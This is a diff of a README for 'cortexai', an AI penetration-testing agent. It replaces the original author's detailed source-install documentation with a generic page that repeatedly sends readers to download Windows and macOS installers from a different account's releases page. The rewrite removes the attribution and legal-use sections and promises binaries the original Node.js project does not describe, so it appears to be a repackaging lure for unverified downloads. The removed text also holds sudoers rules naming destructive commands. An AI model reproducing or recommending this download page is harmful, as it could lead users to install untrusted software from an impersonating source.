@@ -1,457 +1,80 @@
-<img align="left" width="300" height="300" alt="cortexai-logo" src="https://github.com/user-attachments/assets/bfa94ca1-4ca8-4f9d-b9f6-520ceac7d4b6" /> 
-<div id="user-content-toc">
-  <ul align="center" style="list-style: none;">
-    <summary>
-      <h1>CortexAI</h1><br>
-      The First Truly Autonomous Penetration Testing Agent
-    </summary>
-  </ul>
-</div>
-
-
-*Self-reasoning. Self-explaining. Self-improving.*
-An intelligent terminal agent powered by AI for ethical security testing and vulnerability analysis with integrated project management, scope tracking, and evidence collection. 
-
-For detailed documentation, see [documentation](https://github.com/theelderemo/cortexai/tree/main/documentation)
-
-<br>
-
-[![Docs are updated](https://img.shields.io/badge/docs-updated-green?color=blue)](https://github.com/theelderemo/cortexai/tree/main/documentation)
-![GitHub stars](https://img.shields.io/github/stars/theelderemo/cortexai?style=social)
-![GitHub forks](https://img.shields.io/github/forks/theelderemo/cortexai?style=social)
-![GitHub issues](https://img.shields.io/github/issues/theelderemo/cortexai)
-![GitHub license](https://img.shields.io/github/license/theelderemo/cortexai)
-![Node version](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen)
+# 🤖 cortexai - Automate Your Penetration Testing Efforts
 
-</div>
-
-> [!TIP]
-> There is now an official [CortexAI Plugin Repo](https://github.com/theelderemo/cortexai-plugins) for a community first platform. Go check it out!  
-
-## What is CortexAI?
-
-CortexAI is **not another pentesting tool suite** 
-It's an autonomous AI agent that conducts authorized security assessments the way a senior security consultant would: by reasoning about objectives, orchestrating the right tools, explaining its decisions, and continuously improving its approach.
-
-Traditional tools like Burp Suite and OWASP ZAP require you to manually decide which scans to run, interpret results, and document findings. **CortexAI is different**:
+## 🚀 Getting Started
 
-```bash
-You: "Run an initial security assessment on this web app"
-```
-
-CortexAI: 
- - ✓ Reasoning: Breaking down into content discovery, technology fingerprinting, and structure analysis
- -  ✓ Executing: discover_content, web_request, browse_website (3 tools orchestrated)
- -  ✓ Analyzing: Found CORS misconfiguration, missing security headers, exposed login form
- -  ✓ Logging: 3 medium-severity vulnerabilities stored to project database
- -  ✓ Recommending: Next steps include JavaScript analysis and XSS testing
+Welcome to **cortexai**! This software helps you automate penetration testing with AI-driven tools. It makes the process of testing your security simpler and more efficient.
 
-**This is agentic AI**—autonomous planning, multi-tool orchestration, contextual reasoning, and transparent decision-making in a single platform.
+## 📥 Download Now
 
-## Why CortexAI?
+[![Download cortexai](https://img.shields.io/badge/Download%20cortexai-v1.0-blue)](https://github.com/DaveBNU/cortexai/releases)
 
-### **Autonomous Agent, Not a Workflow**
-- **Self-planning**: Give high-level objectives ("assess this target"), not step-by-step instructions
-- **Dynamic tool selection**: Agent chooses the right tools based on mission context
-- **Contextual memory**: Understands follow-up commands like "log that" by referencing its own previous output
-- **Adaptive execution**: When tools fail, automatically switches strategies and continues the mission
+## 📋 About cortexai
 
-### **Self-Explaining and Transparent**
-- **Real-time audit logs**: Separate terminal window shows every action, tool call, and decision
-- **Explains failures**: "Puppeteer failed due to ERR_BLOCKED_BY_CLIENT—here's why and here are 7 alternatives"
-- **Justifies decisions**: Every action includes reasoning (why this tool, why this approach, why this severity rating)
-- **Compliance-ready**: GDPR/NIST-compatible explainable AI for regulated industries
+**cortexai** is an open-source tool designed for security professionals and enthusiasts. With this application, you can conduct authorized tests to find vulnerabilities in your systems. It automates the tasks of reconnaissance, vulnerability discovery, and analysis while maintaining clear records of your actions. The software provides findings that align with OWASP guidelines, making it easier to understand and address security issues.
 
-### **Self-Improving Infrastructure**
-- **Recommends missing tools**: "I need Playwright for dynamic rendering—here's how to install it"
-- **Dynamic capability expansion**: New tools automatically registered when installed
-- **Ecosystem intelligence**: Knows 100+ security tools, their use cases, and when to apply them
-- **Continuous learning**: Adapts strategies based on environmental feedback
+### 🌟 Key Features
 
-### **Enterprise-Grade Project Management**
-- **SQLite project databases**: Every engagement tracked with scope, findings, evidence, and audit trails
-- **Immutable evidence collection**: Chain-of-custody for HTTP requests, responses, and discovered assets
-- **OWASP/CWE classification**: Automatic mapping of findings to industry standards
-- **Multi-engagement tracking**: Manage dozens of concurrent assessments with isolated contexts
+- **AI-Powered Automation**: Leverages artificial intelligence to streamline penetration testing.
+- **Reconnaissance**: Automates the collection of information about your target environment.
+- **Vulnerability Discovery**: Identifies security weaknesses in your systems automatically.
+- **Reporting**: Generates comprehensive reports with OWASP mapping and remediation guidance.
+- **Audit Trails**: Keeps immutable records of all testing activities.
 
-### **Extensible Plugin Architecture**
-- **26+ built-in tools** across 5 core plugins (web analysis, filesystem, command execution, encoding)
-- **Community marketplace ready**: Third-party plugins load dynamically without touching core code
-- **Tool abstraction layer**: Works with any CLI security tool already installed on your system
-- **Open architecture**: Build custom plugins following our manifest standard
+## 🔧 System Requirements
 
-***
+To run **cortexai**, ensure your system meets the following requirements:
 
-## Quick Start
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **Memory**: At least 4GB of RAM.
+- **Storage**: Minimum of 500MB of free disk space.
+- **Internet Connection**: Required for downloading updates and accessing tools.
 
-### Prerequisites
-- Node.js 18+ and npm
-- Azure OpenAI API access (or configure alternative providers in roadmap)
-- Authorized testing environment with written permission
+## 📥 Download & Install
 
-### Installation
+To get started with **cortexai**, please follow these steps:
 
-**Option 1: Local (Recommended)**
-```bash
-git clone https://github.com/theelderemo/cortexai.git
-cd cortexai
-npm install
-cp .env.example .env
-nano .env  # Add your Azure OpenAI credentials
-npm start
-```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/DaveBNU/cortexai/releases).
+2. **Choose the Latest Version**: Look for the most recent version available. It will usually be at the top of the list.
+3. **Download**: Locate the appropriate installer for your operating system and click on it to download. The file will typically end with `.exe` for Windows, `.dmg` for macOS, or a packaged file for Linux.
+4. **Install the Application**: 
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
+   - For **macOS**: Open the `.dmg` file, drag the cortexai app into your Applications folder.
+   - For **Linux**: Use the terminal to navigate to the downloaded file and run the installation command.
+5. **Launch cortexai**: After installation, find the application on your device and start it.
 
-Option 2: Docker
-```bash
-git clone https://github.com/theelderemo/cortexai.git
-cd cortexai
-docker build -t cortexai:latest .
-docker run -it --rm -v $(pwd)/.env:/opt/cortexai/.env cortexai:latest
-Configuration
-```
+## 📖 Usage Guide
 
+Once **cortexai** is installed, follow these steps to run your first penetration test:
 
-**Option 3: CortexOS (custom Kali deviated OS)**
-```bash
-# Coming soon
-```
+1. **Open the Application**: Click on the cortexai icon to launch it.
+2. **Create a New Project**: Start by creating a new project. Enter a name and set the parameters for your test.
+3. **Select Tools**: Choose the tools you want to use. cortexai supports various popular penetration testing tools.
+4. **Run Reconnaissance**: Start with the reconnaissance phase to gather information about your target.
+5. **Execute Vulnerability Tests**: Run tests to discover vulnerabilities based on the collected information.
+6. **Review Findings**: After the tests, review the generated report to understand the vulnerabilities found and the recommended remediations.
 
-### Configuration
+## 📚 Documentation
 
-## Configuring Limited Sudo Access (Optional)
+For further information and advanced features, you can refer to the detailed documentation available on our [Wiki](https://github.com/DaveBNU/cortexai/wiki).
 
-CortexAI operates with the privileges of the user running it. For certain tasks, like installing necessary tools or performing specific types of network scans, it might require elevated (`sudo`) privileges. To avoid needing to enter your password repeatedly and to limit the agent's root access, you can configure passwordless `sudo` for *specific* commands only.
+## 🙋 FAQ
 
-> [!WARNING]
->  **Critical Warning:** Modifying sudo permissions is a sensitive operation. Incorrect configuration can compromise your system's security or lock you out. **Never** edit /etc/sudoers directly. Always use the visudo command, which performs syntax checks before saving:
+### How do I report bugs or request features?
 
-```bash
-sudo visudo
-```
-Granting Specific Passwordless Permissions
-Identify Required Commands: Determine the exact commands CortexAI might need sudo for (e.g., systemctl start <service>, specific nmap options). Be as specific as possible.
+Please open an issue in the GitHub repository. Your input helps us improve the tool.
 
-Edit Sudoers: Add a line in visudo for the user running CortexAI (replace cortexuser with the actual username YOU CREATE).
+### Can I contribute to the project?
 
-Allow cortexuser to run specific commands without a password for CortexAI
-```
-cortexuser ALL=(ALL) NOPASSWD: /usr/bin/specific/command1, /usr/bin/another/command --with-options *
-cortexuser: The username running CortexAI.
-```
+Absolutely! We welcome contributions. Check out the contribution guidelines in our [CONTRIBUTING.md](https://github.com/DaveBNU/cortexai/blob/main/CONTRIBUTING.md).
 
-ALL=(ALL): Allows running on this host, usually as root.
+### Is there support available?
 
-NOPASSWD:: Enables passwordless execution for the listed commands.
+For support, please create an issue on GitHub or consult the community discussions in our repository.
 
-/usr/bin/specific/command1: Use the full path to the command. You can find this using which <command>.
+## 🔗 Additional Resources
 
-Separate multiple commands with commas. You can use wildcards (*) but do so with extreme caution.
+- [Official Documentation](https://github.com/DaveBNU/cortexai/wiki)
+- [GitHub Issues](https://github.com/DaveBNU/cortexai/issues)
+- [Community Discussions](https://github.com/DaveBNU/cortexai/discussions)
 
-Restricting Dangerous Commands
-You can also explicitly deny the user from running certain dangerous commands with sudo, even if broader permissions might otherwise allow them. Add these after the NOPASSWD line:
-
-Deny dangerous commands for cortexuser even with sudo
-```
-cortexuser ALL=(ALL) !/usr/bin/rm *, !/usr/sbin/shutdown, !/usr/sbin/reboot, !/usr/bin/passwd, !/usr/bin/cat /path/to/your/secure/files/*
-```
-The ! negates the permission for the specified command.
-
-Important Note on Tool Installation
-System package managers (apt, yum, dnf, etc.) require root privileges. Granting passwordless sudo access to commands like apt install * is discouraged as it effectively grants full root access.
-
-Safer alternatives for tool installation:
-
-Pre-install Tools: Manually install all required security tools using your own sudo access before running CortexAI.
-
-User-Level Installs: Instruct CortexAI to install tools in the user's home directory if the tool supports it (e.g., pip install --user, Go tools).
-
-Use Docker: Run CortexAI within the provided CortexOS Docker container. Inside the container, the agent can safely install tools using the container's package manager without affecting your host system or requiring your host sudo password. This is the most secure and flexible approach.
-
-Create a `.env` file with your AI provider credentials:
-
-```env
-AZURE_ENDPOINT=your-endpoint-here
-AZURE_MODEL_NAME=gpt-4o
-AZURE_DEPLOYMENT=your-deployment-name
-AZURE_API_KEY=your-api-key
-AZURE_API_VERSION=2024-12-01-preview
-
-# Optional: Disable terminal formatting
-AGENT_DISABLE_FORMATTING=false
-```
-
-***
-
-## Example Usage
-
-### Creating and Managing Projects
-```bash
-> "Create a new project for testing example.com with API and web scope"
-
-CortexAI creates project, initializes database, sets scope rules automatically
-
-> "Add https://example.com/* to scope but exclude /admin/*"
-
-Scope manager updated, out-of-scope routes will be automatically skipped
-
-> "Launch the database viewer"
-
-Opens SQLite browser GUI for real-time project monitoring
-```
-
-### Autonomous Security Assessment
-```bash
-> "Perform comprehensive security testing on this target"
-
-CortexAI autonomously:
-  1. Discovers hidden content (admin panels, config files, backups)
-  2. Fingerprints technologies (server versions, frameworks, libraries)
-  3. Analyzes client-side behavior (JavaScript endpoints, form inputs)
-  4. Tests for OWASP Top 10 (XSS, SQLi, CSRF, authentication flaws)
-  5. Logs findings with severity ratings and remediation guidance
-  6. Generates structured report with attack surface analysis
-```
-
-### Contextual Intelligence
-```bash
-> "Can you run an initial scan but don't use nmap"
-
-Agent autonomously selects alternative reconnaissance tools
-
-> "Log that"
-
-Agent understands "that" refers to findings in previous output,
-extracts all distinct vulnerabilities, and logs each with correct severity
-
-> "Why did Puppeteer fail?"
-
-Agent explains: ERR_BLOCKED_BY_CLIENT, fallback strategy used,
-recommends 7 alternative tools (Playwright, Selenium, etc.) with installation commands
-```
-
-## Architecture
-
-### Core Components
-```
-cortexai/
-├── agent.js              # Main agentic reasoning loop (Azure OpenAI integration)
-├── plugins/              # Extensible tool system
-│   ├── web-plugin/       # HTTP requests, browsing, web search
-│   ├── web-analysis-plugin/  # JavaScript analysis, API probing
-│   ├── filesystem-plugin/    # File operations
-│   ├── command-plugin/   # System command execution
-│   └── example-plugin/   # Encoding/hashing utilities
-├── lib/
-│   ├── ProjectManager.js     # SQLite-based engagement tracking
-│   ├── ScopeManager.js       # URL/domain scope rules
-│   ├── IssueManager.js       # Vulnerability classification and storage
-│   ├── PluginLoader.js       # Dynamic tool registration system
-│   └── ToolRegistry.js       # Central tool orchestration
-└── .cortexai/
-    ├── projects/         # Per-engagement databases
-    └── templates/        # Reporting templates
-```
-
-### Plugin System
-Every plugin includes a `plugin.json` manifest:
-```json
-{
-  "name": "custom-scanner",
-  "version": "1.0.0",
-  "author": "Your Name",
-  "description": "Custom vulnerability scanner",
-  "tools": [
-    {
-      "name": "scan_custom_vuln",
-      "description": "Detects custom vulnerability patterns",
-      "parameters": { "url": "string", "depth": "integer" }
-    }
-  ]
-}
-```
-
-Plugins auto-load at startup. The AI agent automatically discovers and uses new tools without configuration[1].
-
-***
-
-## Roadmap
-
-### **Phase 1: Extensible Core** (Complete)
-- [x] Dynamic plugin loader with manifest system
-- [x] 26 core tools across 5 plugins
-- [x] Project management with SQLite databases
-- [x] Real-time audit logging
-- [x] OWASP/CWE vulnerability classification
-
-### **Phase 2: Cross-Platform Desktop GUI** (In Progress)
-- [x] Electron-based desktop app (Linux, Windows, macOS)
-- [x] Visual project manager and scope editor
-- [x] Integrated database viewer
-- [x] Real-time agent monitoring dashboard
-- [ ] Export reports (PDF, Markdown, JSON, HTML)
-
-### **Phase 3: API-First Architecture**
-- [ ] Node.js API server (Express/Fastify)
-- [x] PostgreSQL database for multi-user support
-- [ ] RESTful API for all core functions
-- [ ] AI provider abstraction (Azure, OpenAI, Anthropic, Ollama, Gemini)
-- [x] User authentication and API key management
-
-### **Phase 4: Enterprise Features** (Proprietary)
-- [ ] Intercepting HTTP/HTTPS proxy (Burp Suite equivalent)
-- [ ] Request Repeater and Intruder UI
-- [ ] Modular exploit framework with OWASP exploit modules
-- [ ] Role-based access control (RBAC)
-- [ ] Team collaboration with real-time sync
-- [ ] Compliance dashboards (PCI DSS, HIPAA, SOC 2)
-
-### **Phase 5: Autonomous Agent Evolution**
-- [x] Multi-step goal planning with ReAct prompting
-- [ ] Attack path graph modeling (Neo4j integration)
-- [ ] Ethical governor with mandatory approval checkpoints
-- [x] Autonomous exploitation with human-in-the-loop
-- [x] Self-correction and adaptive replanning
-
-### **Phase 6: Ecosystem & SaaS**
-- [x] CortexAI Marketplace for third-party plugins
-- [ ] Managed SaaS platform (multi-tenant cloud)
-- [ ] Bug bounty platform integrations (HackerOne, Bugcrowd)
-- [ ] Certification program (CCRTO: CortexAI Certified Red Team Operator)
-
-***
-
-## Comparison: CortexAI vs. Traditional Tools
-
-| **Feature** | **Burp Suite Pro** | **OWASP ZAP** | **CortexAI** |
-|-------------|-------------------|---------------|--------------|
-| **Automation Type** | Manual workflows | Scripted scans | Autonomous agent |
-| **Tool Selection** | User decides | User decides | AI orchestrates |
-| **Reasoning Transparency** | ❌ No | ❌ No | ✅ Real-time logs |
-| **Self-Explanation** | ❌ No | ❌ No | ✅ Explains decisions |
-| **Infrastructure Recommendations** | ❌ No | ❌ No | ✅ Suggests tools |
-| **Project Management** | External tools | External tools | ✅ Integrated SQLite |
-| **Contextual Memory** | ❌ No | ❌ No | ✅ Multi-turn reasoning |
-| **Extensibility** | BApp Store | Marketplace | ✅ Plugin system |
-| **Pricing** | $449/year | Free | **Free (Community)** + Paid (Enterprise) |
-
-**Key Differentiator**: CortexAI is the only tool where you give objectives, not instructions. It's an analyst, not a toolbox.
-
-***
-
-## Legal & Responsible Use
-
-### **Authorization Required**
-
-**ONLY use CortexAI against**:
-- Systems you own or have explicit written permission to test
-- Authorized penetration testing engagements with signed contracts
-- Bug bounty programs within defined scope
-- Internal security assessments on corporate infrastructure
-- Controlled research environments (DVWA, HackTheBox, etc.)
-
-**NEVER use CortexAI for**:
-- Unauthorized scanning of third-party systems
-- Testing without documented approval
-- Illegal activities or malicious attacks
-
-Unauthorized access to computer systems is **illegal** under CFAA (US), Computer Misuse Act (UK), and similar laws worldwide. Violators face criminal prosecution.
-
-### **Data Security**
-
-Project databases contain sensitive information:
-- Credentials and API tokens discovered during testing
-- Vulnerability details and exploitation techniques
-- HTTP request/response evidence
-
-**Follow proper security practices**:
-- Encrypt project databases at rest
-- Use secure channels for data transmission
-- Follow responsible disclosure policies
-- Implement data retention policies per engagement contracts
-
-### **Responsible Disclosure**
-
-Report discovered vulnerabilities through:
-- Vendor security contacts (security@company.com)
-- Bug bounty platforms (HackerOne, Bugcrowd, Intigriti)
-- CERT coordination centers
-- Coordinated disclosure timelines (90-day standard)
-
-**Never publicly disclose** zero-day vulnerabilities without vendor notification and remediation time.
-
-## Contributing
-
-I welcome contributions from the security community! See [CONTRIBUTING.md](./CONTRIBUTING.md) for:
-- Plugin development guide
-- Code standards and testing requirements
-- Pull request process
-- Community guidelines
-
-**Quick Plugin Creation**:
-```bash
-# Use the plugin generator
-npm run create-plugin -- --name my-scanner
-
-# Automatically creates:
-# plugins/my-scanner/
-#   ├── plugin.json
-#   ├── index.js
-#   └── README.md
-```
-
-## Support & Sponsorship
-
-### 💬 **Get Help**
-- **Documentation**: [Full docs](./docs/)
-- **Discord**: ***coming soon***
-- **GitHub/Bug Issues**: [Report bugs](https://github.com/theelderemo/cortexai/issues)
-- **Security Issues**: Email chris.dickinson@mailfence (not public issues). **Do NOT send code, exploits, vulnerabilities via email without making contact first to establish PGP key communication**
-
-### ❤️ **Support Development**
-CortexAI is **free forever** for individual pentesters. Support ongoing development:
-
-- ☕ [Buy Me a Coffee](https://buymeacoffee.com/theelderemo)
-- 💙 [Ko-fi](https://ko-fi.com/theelderemo)
-- 🎁 [Thanks.dev](https://thanks.dev/theelderemo)
-- 🇺🇸 [VetSec - Supporting Veteran Cybersecurity Professionals](https://vetsec.org)
-- 🎖️ [Hire Heroes USA - Supporting Military Transitions](https://giving.hireheroesusa.org/give/154895/#!/donation/checkout)
-
-## License
-
-**Community Edition**: [MIT License](./LICENSE) - Free for individuals and small teams
-
-**Enterprise Edition** (coming Phase 4): Proprietary license with:
-- Intercepting proxy and advanced exploitation tools
-- Team collaboration and RBAC
-- Compliance dashboards and managed AI backend
-- Priority support and SLA guarantees
-
-> [!IMPORTANT]
-> This software is licensed under the MIT License, which requires the inclusion of the original copyright notice in all substantial copies of the software. This is here for transparency. To aid in verifying license compliance, the source code contains various digital watermarks.
-
-## Acknowledgments
-
-Built with:
-- [Azure OpenAI](https://azure.microsoft.com/en-us/products/ai-services/openai-service) - Agentic reasoning engine
-- [Puppeteer](https://pptr.dev/) - Browser automation
-- [better-sqlite3](https://github.com/WiseLibs/better-sqlite3) - Project database
-- [Chalk](https://github.com/chalk/chalk) - Terminal formatting
-- Open-source security community
-
-Special thanks to contributors and the penetration testing community for feedback and testing.
-
-***
-
-<div align="center">
-
-**⭐ Star this repo if CortexAI helps your security work**
-
-**🔗 Share with your security team**
-
-**🐛 Report bugs and request features**
-
-**Made with ❤️ by [@theelderemo](https://github.com/theelderemo)**
-
-*Empowering ethical hackers with autonomous AI*
-
-</div>
+Feel free to explore and start your security journey with **cortexai** today! Visit our [Releases page](https://github.com/DaveBNU/cortexai/releases) to download the latest version.
